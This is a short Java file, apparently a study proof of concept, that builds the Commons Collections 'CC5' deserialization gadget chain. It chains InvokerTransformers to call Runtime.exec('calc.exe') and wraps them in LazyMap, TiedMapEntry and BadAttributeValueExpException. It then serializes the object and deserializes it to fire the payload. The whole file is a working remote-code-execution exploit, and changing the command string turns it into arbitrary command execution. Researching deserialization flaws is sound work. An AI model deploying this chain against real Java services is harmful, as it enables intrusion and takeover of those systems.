package test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static test.cc1.serialize;
import static test.cc1.unserialize;

public class cc5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})
        };

        //将transformers数组存入ChaniedTransformer这个继承类
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //HashMap innermap = new HashMap();
        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> lazymap =  LazyMap.decorate(map,chainedTransformer);//new ConstantTransformer(1)
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"aaa");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(tiedMapEntry);


        serialize(badAttributeValueExpException);
        System.out.println("111");
        unserialize("ser.bin");
    }
}
